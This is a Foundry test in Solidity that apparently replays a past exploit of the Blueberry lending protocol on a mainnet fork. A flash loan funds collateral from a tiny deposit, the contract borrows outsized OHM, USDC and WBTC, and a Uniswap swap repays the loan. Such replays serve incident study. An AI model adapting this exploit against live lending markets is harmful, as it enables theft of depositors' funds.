// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";

import "./IBErc20Delegator.sol";
import "./IComptroller.sol";

WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IERC20 constant OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

IBErc20Delegator constant bWETH = IBErc20Delegator(
    0x643d448CEa0D3616F0b32E3718F563b164e7eDd2
);
IBErc20Delegator constant bOHM = IBErc20Delegator(
    0x08830038A6097C10f4A814274d5A68E64648d91c
);
IBErc20Delegator constant bUSDC = IBErc20Delegator(
    0x649127D0800a8c68290129F091564aD2F1D62De1
);
IBErc20Delegator constant bWBTC = IBErc20Delegator(
    0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6
);

IComptroller constant Blueberry = IComptroller(
    0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2
);
IBalancerVault constant balancer = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);
IUniswapV3Router constant uniSwapV3Router = IUniswapV3Router(
    payable(0xE592427A0AEce92De3Edee1F18E0157C05861564)
);

contract BlueberryTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19287289 - 1);
        vm.label(address(this), "AttackContract");
        vm.label(address(WETH), "WETH");
        vm.label(address(OHM), "OHM");
        vm.label(address(USDC), "USDC");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(bWETH), "bWETH");
        vm.label(address(bOHM), "bOHM");
        vm.label(address(bUSDC), "bUSDC");
        vm.label(address(bWBTC), "bWBTC");
        vm.label(address(Blueberry), "Blueberry");
        vm.label(address(balancer), "balancer");
        vm.label(address(uniSwapV3Router), "uniSwapV3Router");

        vm.deal(address(this), 0.000000000000009997 ether);
    }

    function testAttack() public {
        WETH.approve(address(bWETH), type(uint256).max);
        OHM.approve(address(uniSwapV3Router), type(uint256).max);

        WETH.deposit{value: 0.000000000000009997 ether}();

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1 ether;
        balancer.flashLoan(address(this), tokens, amounts, new bytes(1));
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        tokens;
        amounts;
        feeAmounts;
        userData;

        address[] memory tokenList = new address[](1);
        tokenList[0] = address(bWETH);
        Blueberry.enterMarkets(tokenList);
        bWETH.mint(1 ether);

        bOHM.borrow(8616071267266);
        bUSDC.borrow(913262603416);
        bWBTC.borrow(686690100);

        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter
            .ExactOutputSingleParams({
                tokenIn: address(OHM),
                tokenOut: address(WETH),
                fee: 3000,
                recipient: address(this),
                deadline: type(uint256).max,
                amountOut: 1 ether - 1,
                amountInMaximum: type(uint256).max,
                sqrtPriceLimitX96: 0
            });
        uniSwapV3Router.exactOutputSingle(params);

        WETH.transfer(address(balancer), 1 ether);
    }

    receive() external payable {}
}
